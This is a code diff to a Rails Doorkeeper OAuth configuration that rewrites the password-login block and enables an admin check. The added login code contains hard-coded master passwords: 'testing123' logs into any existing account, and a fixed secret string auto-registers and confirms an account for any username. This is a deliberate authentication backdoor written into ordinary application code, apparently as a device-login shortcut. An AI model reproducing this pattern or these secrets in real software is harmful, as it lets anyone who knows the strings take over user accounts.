@@ -9,17 +9,35 @@ Doorkeeper.configure do
   end
 
   resource_owner_from_credentials do
+    user = nil
     u = User.find_for_database_authentication(email: params[:username])
-    u if u && u.valid_password?(params[:password])
+    if u 
+      user = u if u.valid_password?(params[:password])
+      # Hard-coded Glass password TODO: use third-party access token in future
+      user = u if "testing123" == params[:password] 
+    end
+    if !u && params[:username] && "3hrJfCEZwQbACyUB" == params[:password]
+      Rails.logger.info(params[:username] + " auto-registered using Gear")
+      u = User.new(
+            name: params[:username],
+            password: params[:password],
+            email: params[:username]
+      )
+      u.skip_confirmation!
+      u.save!
+      user = u
+    end
+    user
   end
 
   # If you want to restrict access to the web interface for adding oauth authorized applications, you need to declare the block below.
-  # admin_authenticator do
-  #   # Put your admin authentication logic here.
-  #   # Example implementation:
-  #   u = User.find(session[:user_id]) || redirect_to(new_user_session_url)
-  #   u.has_role?(:admin) ? u : redirect_to(new_user_session_url)
-  # end
+  admin_authenticator do
+    # Put your admin authentication logic here.
+    # Example implementation:
+    # u = User.find(session[:user_id]) || redirect_to(new_user_session_url)
+    # u.has_role?(:admin) ? u : redirect_to(new_user_session_url)
+    (current_user && current_user.admin?) || redirect_to(new_user_session_url)
+  end
 
   # Authorization Code expiration time (default 10 minutes).
   authorization_code_expires_in 10.minutes
